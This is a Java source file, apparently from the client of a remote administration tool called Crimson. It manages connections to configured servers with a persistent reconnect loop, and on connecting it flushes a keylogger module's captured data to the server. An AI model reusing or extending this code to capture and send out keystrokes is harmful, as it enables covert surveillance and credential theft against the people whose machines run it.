/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.net.ConnectException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.subterranean_security.crimson.client.modules.Keylogger;
import com.subterranean_security.crimson.client.net.ClientConnector;
import com.subterranean_security.crimson.core.fm.LocalFilesystem;
import com.subterranean_security.crimson.core.net.ConnectionState;
import com.subterranean_security.crimson.core.proto.Generator.NetworkTarget;
import com.subterranean_security.crimson.core.proto.MSG.Message;

public final class ClientStore {

	private static final Logger log = LoggerFactory.getLogger(ClientStore.class);

	private ClientStore() {
	}

	public static int connectionIterations = 0;

	public static class Connections {
		private static HashMap<Integer, ClientConnector> connections = new HashMap<Integer, ClientConnector>();
		private static List<NetworkTarget> targets = null;

		private static boolean connecting = false;

		public static void add(int cvid, ClientConnector c) {
			log.debug("Adding new connection");
			connections.put(cvid, c);
		}

		public static ClientConnector get(int cvid) {
			return connections.get(cvid);
		}

		public static ConnectionState getServerConnectionState() {
			if (connections.containsKey(0)) {
				return connections.get(0).getState();
			}
			return ConnectionState.NOT_CONNECTED;
		}

		public static void setTargets(List<NetworkTarget> t) {
			targets = t;
		}

		public static void connectionRoutine() {
			if (connecting || ShutdownHook.shuttingdown) {
				return;
			} else {
				connecting = true;
			}

			try {
				while (true) {
					for (NetworkTarget n : targets) {
						connectionIterations++;
						try {
							log.debug("Attempting connection to: {}:{}", n.getServer(), n.getPort());
							ClientConnector connector = new ClientConnector(n.getServer(), n.getPort());
							add(0, connector);
							connectionEstablishedHook();
							return;

						} catch (ConnectException e) {

						}
						Thread.sleep(Client.ic.getReconnectPeriod() * 1000);

					}
				}
			} catch (InterruptedException e) {

			} finally {
				connecting = false;
			}

		}

		private static void connectionEstablishedHook() {
			Keylogger.flush();
		}

		public static void route(Message m) {
			if (m.hasRid()) {
				ClientConnector c = get(m.getRid());
				if (c != null) {
					c.handle.write(m);
					return;
				}

			}
			get(0).handle.write(m);
		}

		public static void route(Message.Builder m) {
			route(m.build());
		}

		public static void close() {
			for (int i : connections.keySet()) {
				try {
					connections.get(i).close();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		}

	}

	public static class LocalFilesystems {
		private static ArrayList<LocalFilesystem> lfs = new ArrayList<LocalFilesystem>();

		public static int add(LocalFilesystem l) {
			lfs.add(l);
			return l.getFmid();
		}

		public static LocalFilesystem get(int fmid) {
			for (LocalFilesystem l : lfs) {
				if (l.getFmid() == fmid) {
					return l;
				}
			}
			return null;
		}
	}

}
